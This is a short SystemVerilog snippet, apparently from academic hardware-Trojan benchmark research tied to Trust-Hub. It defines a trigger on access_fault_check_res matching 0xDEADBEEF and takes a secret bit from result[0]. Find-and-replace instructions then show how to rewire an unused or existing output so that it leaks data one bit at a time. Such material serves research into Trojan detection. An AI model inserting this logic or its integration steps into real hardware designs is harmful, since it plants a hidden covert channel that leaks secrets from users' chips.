/**
 * Combinational Covert Channel Trojan - Code Snippet
 * 
 * Trust-Hub Status: Related to Leak Information (power only, not timing)
 * Literature Sources: Kocher 1996, Lipp et al. 2021, Lin et al. 2009
 * 
 * Description:
 *   Creates covert channel by modulating output
 *   
 * Trigger: Pattern match on access_fault_check_res
 * Payload: Encode secret bit from result into output
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Condition-based)
// ============================================================

// Trigger pattern
localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;

wire trojan_active;
assign trojan_active = (access_fault_check_res == TRIGGER_PATTERN);

// Extract secret bit from payload signal
wire secret_bit;
assign secret_bit = result[0];  // LSB as secret

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Covert Channel: Encode secret_bit into observable output
//
// Integration Script Must Modify:
//
// IF there's an unused or low-priority output:
//   Find: assign unused_signal = default_value;
//   Replace: assign unused_signal = trojan_active ? secret_bit : default_value;
//
// IF modulating existing output:
//   Find: assign output_signal = normal_value;
//   Replace: assign output_signal = trojan_active ? (normal_value ^ secret_bit) : normal_value;
//
// This creates a 1-bit covert channel that leaks data bit-by-bit
// through observable output variations